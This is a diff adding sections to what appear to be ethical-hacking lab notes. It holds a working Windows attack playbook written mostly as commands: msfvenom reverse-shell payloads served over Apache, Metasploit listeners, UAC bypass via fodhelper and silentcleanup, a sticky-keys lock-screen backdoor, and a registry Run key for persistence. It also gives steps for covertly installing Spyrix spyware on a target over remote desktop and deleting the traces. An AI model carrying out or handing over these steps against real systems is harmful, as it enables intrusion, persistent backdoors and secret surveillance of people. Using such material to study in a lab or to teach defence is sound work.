@@ -849,7 +849,162 @@ It’s basically a wrapper around the OpenAI API.
         ./shellcode.py
     ```       
     - in listening port terminal shell access to the target vulnerable server has been established
-</detals>
+</details>
 
+<details>
+<summary>Perform Privilege Escalation to Gain Higher Privileges</summary>
 
+* Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys :~
+  - we are exploiting Sticky keys feature to gain access and to escalate privileges on the target machine
+  - switch to the Parrot Security machine and login with attacker/toor
+  - sudo su and cd for root directory
+  - run command for creating a payload:
+   ```console
+       msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+   ```
+  - -f = file formate
+  - > = store output in to this file  
+  -  i want to share the payload from host system to target machine
+  - to create share directory and give all owner permission to that directory:
+   ```console
+       //to create directory
+       mkdir /var/www/html/share
 
+       //to give full permission
+       chmod -R 755 /var/www/html/share
+
+       //to change user to owner
+       chown -R www-data:www-data /var/www/html/share
+   ```
+  - Copy the payload into the shared folder by executing:
+   ```console
+       cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+   ```
+  - Start the Apache server by executing 
+   - service apache2 start
+  - open metasploit framework and set payload and create listner for listening
+   ```console
+       msfconsole    
+       use exploit/multi/handler
+       set payload windows/meterpreter/reverse_tcp 
+       set lhost <host_ip>
+       set lport <host_port>
+       run
+   ```
+  - switch back to the windows or target machine and Open any web browser
+   - http://10.10.1.13/share
+   -  download the file inside that directory 
+  - switch to the Parrot Security machine and type
+   - sysinfo
+   - getuid
+
+  - bypass the user account control setting(in metasploit)
+  - background(this is for clearing the current sesssion)
+  - search bypassuac(this is module)
+  - we are using the fodhelper for this 
+  - use exploit/windows/local/bypassuac_fodhelper
+  - set session 1
+  - show options
+  - set LHOST <host_ip>
+  - set TARGET 0
+  - exploit 
+  - getsystem -t 1
+  - getuid
+  - The BypassUAC exploit has successfully
+  - background
+
+  - we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11
+   ```console
+       use post/windows/manage/sticky_keys
+       sessions -i*
+       set session 2
+       exploit
+   ```
+  - Martin is a user account without any admin privileges, lock the system and from the lock screen press Shift key 5 times
+  - this will open a command prompt on the lock screen
+  - whoami 
+  - We can see that we have successfully got a persistent System level access to the target system by exploiting sticky keys
+</details>
+
+<details>
+<summary>Maintain Remote Access and Hide Malicious Activities</summary>
+
+* User System Monitoring and Surveillance using Spyrix :~
+  - Spyrix is a commercial spyware/keylogger that is often marketed as “parental control” software, but in reality it works like a surveillance tool
+  - open host machine and lanch spyrix and register in the website of the spyrix
+  - give your gmail and login to spyrix
+  - find remote desktop connection to connect target system connection using target system ip address and username
+  - remote desktop connection
+  - <target_ip>
+  - <target_username>
+  - minimize remote desktop connection in target machine and copy spyrix from host machine to target machine
+  - open spyrix in target machine
+  - enter same gmail which gmail you are login in host machine
+  - clear the process and delete that spyrix and close the target remote connection
+  - in host machine maximize the spyrix web and the new device connected pop-up appears
+  - now u will connect and servellence or get all data of the target machine
+  - you will create your report also
+
+* Maintain Persistence by Modifying Registry Run Keys :~
+  - parrot terminal
+  - sudo su and cd for root terminal
+  - create a payload as Test.exe 
+    ```console
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
+    ```
+  - create a payload as registry.exe
+    ```console
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+    ```
+  - to create, give full owner access to share directory in /var/www/html/ 
+    ```console
+        mkdir /var/www/html/share
+        chmod -R 755 /var/www/html/share/
+        chown -R www-data:www-data /var/www/html/share
+    ```    
+  - Copy the both payloads into the shared folder
+    ```console
+        cp /home/attacker/Desktop/Test.exe /var/www/html/share/
+        cp /home/attacker/Desktop/registry.exe /var/www/html/share/
+    ```
+  - service apache2 start 
+  - msfconsole 
+  - use exploit/multi/handler
+  - set payload windows/meterpreter/reverse_tcp
+  - set lhost <host_ip>
+  - set lport <host_port>
+  - run
+  - open target machine
+  - open web browser and type http://<host_ip>/directory_name
+  - download both payloads in target machine
+  - double click test.exe
+  - The meterpreter session has successful
+  - getuid 
+  - background
+
+  - in metasploit using silentcleanup module 
+    ```console
+        use exploit/windows/local/bypassuac_silentcleanup
+        set LHOST <host_ip>
+        set target 0 
+        exploit  
+    ```
+  - The BypassUAC exploit has successfully bypassed the UAC setting
+  - getsystem -t 1 
+  - getuid 
+  - open the shell in their using command shell
+    ```console
+        reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
+    ```
+  - open another terminal window
+    - msfconsole
+    - use exploit/multi/handler
+    - set payload windows/meterpreter/reverse_tcp
+    - set lhost <host_ip>
+    - set lport <host_port> 
+    - exploit
+  - go to the target machine and restart the machine
+  - switch to the Parrot Security machine and you can see that the meterpreter session is opened.
+  - getuid 
+  - attacker can maintain persistence on the target machine using Run Registry keys                               
+</details>
